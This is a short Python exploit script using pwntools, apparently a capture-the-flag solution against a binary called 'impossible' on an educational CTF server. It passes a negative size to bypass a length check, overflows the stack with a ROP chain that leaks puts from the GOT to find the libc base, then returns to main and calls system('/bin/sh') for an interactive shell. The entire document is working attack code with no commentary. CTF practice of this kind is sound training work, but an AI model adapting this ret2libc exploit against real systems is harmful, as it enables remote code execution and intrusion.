from pwn import *

context(arch='amd64', log_level='debug')

e = ELF('impossible')
libc = ELF('libc-2.27.so')

pop_rsi_r15 = 0x0000000000400871
pop_rdi = 0x0000000000400873
ret = 0x0000000000400294

r = remote('eductf.zoolab.org', 10105)
#  r = remote('localhost', 1111)

r.sendlineafter('Size: ', '-2147483648')
r.recvline()
r.recvline()
r.send(b'a' * 0x108 + flat(
    pop_rdi,
    e.got.puts,
    e.sym.puts,

    e.sym.main
))

libc.address = u64(r.recv(6) + b'\0\0') - libc.sym.puts
success('libc=' + hex(libc.address))

r.sendlineafter('Size: ', '-2147483648')
r.send(b'a' * 0x108 + flat(
    ret,

    pop_rdi,
    next(libc.search(b'/bin/sh')),
    libc.sym.system
))

r.interactive()
